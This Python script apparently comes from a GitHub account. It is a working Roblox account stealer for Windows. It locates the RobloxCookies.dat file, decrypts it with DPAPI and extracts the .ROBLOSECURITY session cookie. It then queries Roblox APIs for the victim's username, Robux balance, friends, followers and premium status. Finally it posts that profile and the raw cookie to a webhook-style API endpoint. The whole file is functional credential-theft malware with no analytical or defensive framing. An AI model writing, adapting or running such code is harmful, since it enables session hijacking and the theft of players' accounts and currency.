# iosxvv
# https://github.com/iosviolador
import base64
import ctypes
import ctypes.wintypes
import json
import os
import sys

import requests
from embed import *

API = "http://127.0.0.1:8080/api/send_wh_msg"
class _BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_ubyte)),
    ]


def dpapi_decrypt(raw: bytes) -> bytes | None:
    blob_in = _BLOB()
    blob_in.cbData = len(raw)
    blob_in.pbData = (ctypes.c_ubyte * len(raw))(*raw)
    blob_out = _BLOB()

    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0x1, ctypes.byref(blob_out)
    ):
        result = bytes(
            (ctypes.c_ubyte * blob_out.cbData).from_address(
                ctypes.addressof(blob_out.pbData.contents)
            )
        )
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return result

    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        result = bytes(
            (ctypes.c_ubyte * blob_out.cbData).from_address(
                ctypes.addressof(blob_out.pbData.contents)
            )
        )
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return result

    return None


def raw_cookie(raw_jar: str) -> str | None:
    marker = ".ROBLOSECURITY"
    pos = raw_jar.find(marker)
    if pos == -1:
        return None

    v_start = pos + len(marker)
    while v_start < len(raw_jar) and raw_jar[v_start] in (" ", "\t", "\0", "="):
        v_start += 1

    v_end = v_start
    while v_end < len(raw_jar):
        if raw_jar[v_end] in (";", "\n", "\r", "\0"):
            break
        v_end += 1

    cookie = raw_jar[v_start:v_end].rstrip()
    return cookie if cookie else None


def cookies_data(filepath: str) -> str | None:
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            raw_json = f.read()
    except Exception:
        return None

    try:
        data = json.loads(raw_json)
    except json.JSONDecodeError:
        return None

    b64 = data.get("CookiesData", "")
    if not b64:
        return None

    try:
        encrypted_data = base64.b64decode(b64)
    except Exception:
        return None

    decrypted_data = dpapi_decrypt(encrypted_data)
    if not decrypted_data:
        return None

    jar = decrypted_data.decode("utf-8", errors="replace")
    return raw_cookie(jar)

def get_roblox(url: str, cookie: str) -> requests.Response:
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "RobloxMgr/1.0",
        "Accept": "application/json",
    }
    return requests.get(url, headers=headers, timeout=10)
def fetch_info(cookie: str) -> dict | None:
    try:
        r = get_roblox("https://users.roblox.com/v1/users/authenticated", cookie)
        if not r.ok or '"id"' not in r.text:
            return None
        user = r.json()
    except Exception:
        return None

    user_id = user.get("id")
    username = user.get("name", "Unknown")
    display_name = user.get("displayName", username)

    robux = "0"
    try:
        r = get_roblox(f"https://economy.roblox.com/v1/users/{user_id}/currency", cookie)
        if r.ok:
            robux = str(r.json().get("robux", 0))
    except Exception:
        pass

    friends = "0"
    try:
        r = get_roblox(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", cookie)
        if r.ok:
            friends = str(r.json().get("count", 0))
    except Exception:
        pass

    followers = "0"
    try:
        r = get_roblox(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", cookie)
        if r.ok:
            followers = str(r.json().get("count", 0))
    except Exception:
        pass

    avatar_url = ""
    try:
        r = get_roblox(
            f"https://thumbnails.roblox.com/v1/users/avatar-headshot"
            f"?userIds={user_id}&size=150x150&format=Png&isCircular=false",
            cookie,
        )
        if r.ok:
            data = r.json().get("data", [])
            if data:
                avatar_url = data[0].get("imageUrl", "")
    except Exception:
        pass

    has_premium = False
    try:
        r = get_roblox(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            cookie,
        )
        if r.ok:
            has_premium = "true" in r.text.lower()
    except Exception:
        pass

    return {
        "user_id": user_id,
        "username": username,
        "display_name": display_name,
        "robux": robux,
        "followers": followers,
        "friends": friends,
        "avatar_url": avatar_url,
        "premium": has_premium,
    }

def send_msg(info: dict, cookie: str) -> bool:
    payload = embed_payload(info, cookie)

    try:
        r = requests.post(API, json=payload, timeout=10)
        if r.status_code == 403:
            return False
        r.raise_for_status()
        return True
    except Exception:
        return False


def main():
    local = os.environ.get("LOCALAPPDATA", "")
    cookie_path = os.path.join(local, "Roblox", "LocalStorage", "RobloxCookies.dat")

    if not os.path.isfile(cookie_path):
        sys.exit(1)

    cookie = cookies_data(cookie_path)
    if not cookie:
        sys.exit(1)

    info = fetch_info(cookie)
    if not info:
        sys.exit(1)

    send_msg(info, cookie)


if __name__ == "__main__":
    main()
